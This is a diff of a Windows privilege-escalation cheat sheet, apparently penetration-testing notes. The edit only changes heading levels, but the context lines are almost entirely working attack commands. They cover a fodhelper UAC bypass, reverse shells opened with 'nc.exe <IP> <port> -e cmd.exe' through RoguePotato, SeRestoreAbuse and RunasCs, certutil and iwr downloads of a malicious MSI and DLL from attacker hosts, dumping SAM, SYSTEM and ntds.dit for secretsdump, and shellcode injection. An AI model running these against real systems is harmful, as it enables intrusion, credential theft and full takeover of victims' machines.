@@ -23,25 +23,25 @@ net group "group name" /domain
 (IO) - Inherit Only (applies to subdirectories and files within the directory)  
 (OI) - Object Inherit (applies to files)  
 (CI) - Container Inherit (applies to subdirectories)  
-##### check the created owner of folder
+### check the created owner of folder
 ```
 Get-ACL <FolderPath> | Select-Object Owner
 ``` 
-##### LOLBAS
+### LOLBAS
 https://lolbas-project.github.io/#  
 (similar to gtfobins)
-##### AutoEnumeration
+### AutoEnumeration
 winpeas.exe
-##### Gain Interactive Shell after add user to local Administrator group
+### Gain Interactive Shell after add user to local Administrator group
 Require GUI access
 ```
 1. runas /user:backupadmin cmd
 2. open cmd as admin, input dave2 password
 ```
-##### Powershell Script Block Logging
+### Powershell Script Block Logging
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/9c355e20-e841-4c1e-b384-9e53f05aaaa2)
 
-##### Find process info
+### Find process info
 ```
 tasklist /fi "pid eq <PID>"
 Get-Process -Id <PID>
@@ -50,7 +50,7 @@ Get-Process ProcessName | Select-Object *
 tasklist /v /fi "PID eq 664"(shows runner of pid 664)
 tasklist /FO TABLE /NH(show all process' pid)
 ```
-##### find service with filename
+### find service with filename
 ```
 wmic service get name,pathname |  findstr /i "backup.exe"
 ```
@@ -58,7 +58,7 @@ wmic service get name,pathname |  findstr /i "backup.exe"
 ```
 "service_name" | Get-ServiceAcl | select -ExpandProperty Access
 ```
-##### Check which user runns this service
+### Check which user runns this service
 ```
 Get-Service -Name "RasMan" | Select-Object Name, Status, DisplayName, UserName
 sc qc <service_name>
@@ -68,18 +68,18 @@ Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" | Get-Member
 (list all objects u can select for Get-WmiObject -Class Win32_Service -Filter "Name='GPGOrchestrator'" command)
 
 ```
-##### Check which exe file using specific dll
+### Check which exe file using specific dll
 ```
 tasklist /m dllname
 tasklist /m (list all process using which dlls)
 ```
 
-##### list relationship between Processes and Services (Windows can't list processes run by privileged users)
+### list relationship between Processes and Services (Windows can't list processes run by privileged users)
 ```
 tasklist /svc
 tasklist /svc /fi "imagename eq your_file.exe"
 ```
-##### Service Actions
+### Service Actions
 ```
 Start-Service -Name ""
 Stop-Service -Name ""
@@ -88,19 +88,19 @@ sc start servicename
 shutdown /r /t 0
 ```
 
-##### Powershell history
+### Powershell history
 ```
 (Get-PSReadlineOption).HistorySavePath
 ```
 
-##### Firewall
+### Firewall
 ```
 netsh advfirewall show currentprofile  
 netsh advfirewall show allprofile  
 netsh advfirewall firewall show rule name=all
 ```
 
-##### Scheduled Tasks
+### Scheduled Tasks
 ```
 schtasks /query /fo LIST /v
 schtasks /query /v /fo list | findstr /i "backup.exe"
@@ -114,17 +114,17 @@ move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
-##### Enumerating Unmounted Disks
+### Enumerating Unmounted Disks
 ```
 mountvol
 ```
 
-##### Enumerating Device Drivers and Kernel Modules
+### Enumerating Device Drivers and Kernel Modules
 ```
 1. driverquery /v /FO Table  
 2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
 ```
-##### Bypass UAC
+### Bypass UAC
 ```
 1. check C:\Windows\System32\fodhelper.exe
 2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -140,7 +140,7 @@ set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
 
-##### Insecure File Permissions
+### Insecure File Permissions
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
 2. icacls "service path" # check if current user has permission to replace file with malicious one
@@ -149,7 +149,7 @@ Note to set payload the same arch with session 1's payload，set lhost and lport
 5. whoami /priv #check out shutdown privileges of user
 ```
 
-##### Unquoted Service Paths
+### Unquoted Service Paths
 To list all unquoted service paths (minus built-in Windows services)
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -181,7 +181,7 @@ Import-Module .\PowerUp.ps1
 Get-UnquotedService
 ```
 
-##### Service Binary Hijacking
+### Service Binary Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
@@ -222,7 +222,7 @@ Import-Module .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
 
-##### Service DLL Hijacking
+### Service DLL Hijacking
 >The following is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
 ```
 1.The directory from which the application loaded.
@@ -282,7 +282,7 @@ Replace and restart service:
 iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
 Restart-Service BetaService
 ```
-##### AlwaysInstallElevated
+### AlwaysInstallElevated
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -292,7 +292,7 @@ certutil.exe -urlcache -f http://10.0.2.5:8888/evil.msi evil.msi
 sudo rlwrap nc- nlvp 443
 evil.msi
 ```
-##### Abusing Server Operators Group
+### Abusing Server Operators Group
 ```
 Check Writtable Services Under Registry To Current User:
 
@@ -305,7 +305,7 @@ sc start AppReadiness
 ```
 ![image](https://github.com/user-attachments/assets/b3dee6e9-4c6f-4324-8af8-3d95e0650cec)
 ![image](https://github.com/user-attachments/assets/e9a421db-8fce-4d1e-8284-59927a883115)
-##### Abusing Backup Operators Group
+### Abusing Backup Operators Group
 ```
 import-module .\SeBackupPrivilegeUtils.dll
 import-module .\SeBackupPrivilegeCmdLets.dll
@@ -321,7 +321,7 @@ Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
 reg save HKLM\SYSTEM system
 reg save HKLM\SAM sam
 ```
-##### Named Pipes(PrintSpoofer)
+### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
 Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
@@ -330,7 +330,7 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 
 whoami
 ```
-##### Godpotato
+### Godpotato
 ImpersonatePrivilege permission required  
 Windows Server 2012 - Windows Server 2022, Windows 8 - Windows 11
 ```
@@ -355,7 +355,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
 ```
 ![image](https://github.com/user-attachments/assets/cae43a79-e6ba-4c1a-9294-0947fc636b3c)
 
-##### Rogue Potato
+### Rogue Potato
 ImpersonatePrivilege permission required
 ```
 RoguePotato.exe -r 10.10.10.3(LHOST) -e "nc.exe 10.10.10.3 3001 -e cmd.exe" -l 9999
@@ -364,7 +364,7 @@ RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 99
 
 nc.exe -nlvp 3001
 ```
-##### JuicyPotato
+### JuicyPotato
 SeImpersonatePrivilege Impersonate a client after authentication Enabled + Windows Serverr 2008 Standard = JuicyPotato  
 SeImpersonate or SeAssignPrimaryToken privileges Required  
 Visit https://ohpe.it/juicy-potato/CLSID/ for a list of CLSIDs to try.
@@ -374,7 +374,7 @@ JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}/{4991d34b-80a
 ### Token Abuse
 Tips: Always try cmd.exe with admin rights to check for more priv  
 Full token privileges cheatsheet at https://github.com/gtworek/Priv2Admin
-##### SeBackupPrivilege
+### SeBackupPrivilege
 ```
 windows: reg save HKLM\SAM C:\users\public\SAM
 windows: reg save HKLM\SYSTEM C:\users\public\SYSTEM
@@ -383,7 +383,7 @@ copy sam and system to kali
 
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
-##### SeRestorePrivilege To System
+### SeRestorePrivilege To System
 ```
 Terminal Version:
 
@@ -393,7 +393,7 @@ cmd.exe /c sc qc seclogon
 upload nc.exe
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 4444 -e powershell.exe"
 ```
-##### SeManageVolumePrivilege to System
+### SeManageVolumePrivilege to System
 ```
 C:\xampp\htdocs\uploads>whoami
 access\svc_mssql
@@ -423,12 +423,12 @@ c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
 https://github.com/xct/SeManageVolumeAbuse?tab=readme-ov-file
 ./SeManageVolumeAbuse.exe
 ```
-##### SeDebug to System
+### SeDebug to System
 Run: SeDebugAbuse.exe <pid>. This will inject shellcode (you have to copy it into the source) into a process & run it. When targeting a SYSTEM process and you have the SeDebug privilege it will run as SYSTEM even though you normally could not get a handle to a SYSTEM process. Note that some processes are protected (e.g. PID=4) and can not be used as a target. A good alternative is the spool service.
 ```
 https://github.com/xct/SeDebugAbuse
 ```
-##### PowerUp.ps1
+### PowerUp.ps1
 ```
 Service Enumeration:
 Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
@@ -467,7 +467,7 @@ Invoke-AllChecks                    -   runs all current escalation checks and r
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 ```
-##### Windows.old
+### Windows.old
 >Essentially, the Windows.old folder just contains the old Windows system. From the Windows system files to your installed programs and each user account’s settings and files, it’s all here. The new version of Windows just keeps it around in case you’d like to go back to that older version of Windows or in case you need to dig in and find a file.
 ```
 1. Find SAM and SYSTEM file under Windows.old\Windows\System32\
@@ -478,17 +478,17 @@ Invoke-AllChecks
 ```
 impacket-secretsdump -ntds /home/kali/Desktop/Active\ Directory/ntds.dit -system /home/kali/Desktop/registry/SYSTEM local
 ```
-##### Check Compressed files
+### Check Compressed files
 ```
 check zip,gz,7z,stix,rar files
 ```
-##### Runascs to lateral move 
+### Runascs to lateral move 
 ```
 runascs.exe username password powershell.exe -r lhost:lport
 nc -nlvp 7777
 RunasCs.exe svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.167 4444 -e cmd.exe"
 ```
-##### Powershell to get interactive shell as another user
+### Powershell to get interactive shell as another user
 ```
 ps > $env:ComputerName
 ps > $user = "CONTROL\hector"
@@ -588,7 +588,7 @@ int main(int argc, char *argv[])
 }
 ```
 Basic.exe pid of process run by root(tasklist /FO TABLE /NH)
-##### Advanced Process Injection
+### Advanced Process Injection
 ```
 compile AdvancedProcessInjection.cpp
 AdvancedProcessInjection.exe pid
